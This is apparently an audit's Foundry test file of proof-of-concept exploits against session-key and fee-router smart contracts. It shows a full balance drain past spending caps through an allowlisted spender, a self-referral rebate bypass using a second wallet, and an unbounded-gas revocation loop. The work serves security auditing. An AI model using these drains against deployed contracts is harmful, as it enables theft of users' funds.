// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {SessionKeyDelegate} from "../src/SessionKeyDelegate.sol";
import {FeeRouter, Route} from "../src/FeeRouter.sol";

contract PocToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(address holder, uint256 amount) { balanceOf[holder] = amount; }

    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a; return true;
    }
    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[t] += a; return true;
    }
    /// @dev Un-decoded, value-moving selector present on many real ERC-20s.
    function increaseAllowance(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] += a; return true;
    }
}

/// @dev Stand-in for the Mezo Router: an allowlisted, NON-token target that
///      spends the account's ERC-20 allowance and pays out to a caller-chosen
///      address. Selector is not one the delegate decodes.
contract PocSpender {
    function swapTo(address token, address from, address to, uint256 amt) external {
        PocToken(token).transferFrom(from, to, amt);
    }
}

contract PocTest is Test {
    SessionKeyDelegate delegate;
    PocToken token;
    PocSpender spender;

    address key = address(0x5E5510);
    address attacker = address(0xA77ACC);

    uint48 expiry;
    uint128 constant TOK_PER_TX = 100e18;
    uint128 constant TOK_DAILY = 150e18;

    bytes4 constant SEL_TRANSFER = bytes4(keccak256("transfer(address,uint256)"));
    bytes4 constant SEL_APPROVE = bytes4(keccak256("approve(address,uint256)"));
    bytes4 constant SEL_INCREASE = bytes4(keccak256("increaseAllowance(address,uint256)"));

    function setUp() public {
        delegate = new SessionKeyDelegate();
        spender = new PocSpender();
        token = new PocToken(address(delegate), 1_000e18);
        expiry = uint48(block.timestamp + 30 days);
        vm.deal(address(delegate), 100 ether);
    }

    // ── PoC B: token caps bypassed entirely via an allowlisted spender target ──
    function test_poc_uncappedDrainThroughAllowlistedSpender() public {
        bytes4[] memory tokSels = new bytes4[](2);
        tokSels[0] = SEL_TRANSFER;
        tokSels[1] = SEL_APPROVE;
        bytes4[] memory spSels = new bytes4[](1);
        spSels[0] = PocSpender.swapTo.selector;

        SessionKeyDelegate.TargetPolicy[] memory p = new SessionKeyDelegate.TargetPolicy[](2);
        p[0] = SessionKeyDelegate.TargetPolicy({
            target: address(token), selectors: tokSels,
            tokenPerTxCap: TOK_PER_TX, tokenDailyCap: TOK_DAILY
        });
        p[1] = SessionKeyDelegate.TargetPolicy({
            target: address(spender), selectors: spSels,
            tokenPerTxCap: 0, tokenDailyCap: 0
        });

        vm.prank(address(delegate));
        delegate.registerSession(key, expiry, 1 ether, 2 ether, p);

        // Root grants the router a standing allowance (root path is uncapped).
        vm.prank(address(delegate));
        delegate.execute(address(token), 0, abi.encodeCall(PocToken.approve, (address(spender), type(uint256).max)));

        // Session key drains the FULL balance to a NON-allowlisted address,
        // in ONE call, despite tokenPerTxCap = 100e18 / tokenDailyCap = 150e18.
        vm.prank(key);
        delegate.execute(
            address(spender), 0,
            abi.encodeCall(PocSpender.swapTo, (address(token), address(delegate), attacker, 1_000e18))
        );

        assertEq(token.balanceOf(attacker), 1_000e18, "drained past caps");
        assertEq(token.balanceOf(address(delegate)), 0, "account emptied");
        assertEq(delegate.tokenUsage(key, address(token)), 0, "cap accounting saw NOTHING");
    }

}

// ── PoC A: FeeRouter referral rebate via a second wallet the caller owns ─────

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[t] += a; return true;
    }
}

contract MockRouter {
    MockERC20 public immutable tokenOut;
    constructor(MockERC20 o) { tokenOut = o; }
    function swapExactTokensForTokens(uint256 amountIn, uint256, Route[] calldata routes, address to, uint256)
        external returns (uint256[] memory amounts)
    {
        MockERC20(routes[0].from).transferFrom(msg.sender, address(this), amountIn);
        tokenOut.mint(to, amountIn * 2);
        amounts = new uint256[](2); amounts[0] = amountIn; amounts[1] = amountIn * 2;
    }
}

contract FeeRouterPocTest is Test {
    MockERC20 tokenIn; MockERC20 tokenOut; MockRouter router; FeeRouter fr;
    address user = address(0xBEEF);
    address operator = address(0xFEE);

    function setUp() public {
        tokenIn = new MockERC20(); tokenOut = new MockERC20();
        router = new MockRouter(tokenOut);
        fr = new FeeRouter(address(router), operator, 50, 3000); // 0.5% fee, 30% max referral
        tokenIn.mint(user, 1_000e18);
        vm.prank(user);
        tokenIn.approve(address(fr), type(uint256).max);
    }

    function _routes() internal view returns (Route[] memory r) {
        r = new Route[](1);
        r[0] = Route({from: address(tokenIn), to: address(tokenOut), stable: false, factory: address(0xFAC)});
    }

    function test_poc_selfReferralGuardBypassedBySecondWallet() public {
        address userSecondWallet = address(0xB0B0); // same human, different key

        vm.prank(user);
        fr.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, userSecondWallet, 3000, 0);

        // fee = 0.5e18; 30% rebated to an address the CALLER controls.
        assertEq(tokenIn.balanceOf(userSecondWallet), 0.15e18, "rebate captured");
        assertEq(tokenIn.balanceOf(operator), 0.35e18, "operator lost 30% of the fee");
    }
}

// ── PoC D: revokeSession is an unbounded loop over the whole scope ───────────
contract RevokeGasPocTest is Test {
    SessionKeyDelegate delegate;
    address key = address(0x5E5510);

    function setUp() public { delegate = new SessionKeyDelegate(); }

    function _addTargets(uint256 n) internal {
        bytes4[] memory sels = new bytes4[](1);
        sels[0] = bytes4(0x12345678);
        SessionKeyDelegate.TargetPolicy[] memory p0 = new SessionKeyDelegate.TargetPolicy[](0);
        vm.prank(address(delegate));
        delegate.registerSession(key, uint48(block.timestamp + 30 days), 1 ether, 2 ether, p0);
        for (uint256 i = 1; i <= n; i++) {
            SessionKeyDelegate.TargetPolicy memory p = SessionKeyDelegate.TargetPolicy({
                target: address(uint160(0x10000 + i)), selectors: sels,
                tokenPerTxCap: 0, tokenDailyCap: 0
            });
            vm.prank(address(delegate));
            delegate.setTargetPolicy(key, p);
        }
    }

    function test_poc_revokeGasGrowsUnbounded() public {
        _addTargets(400);
        assertEq(delegate.targetCount(key), 400);
        uint256 g = gasleft();
        vm.prank(address(delegate));
        delegate.revokeSession(key);
        uint256 used = g - gasleft();
        emit log_named_uint("revokeSession gas for 400 targets", used);
        emit log_named_uint("gas per target", used / 400);
        emit log_named_uint("targets that would exceed a 30M block", (30_000_000 * 400) / used);
    }
}
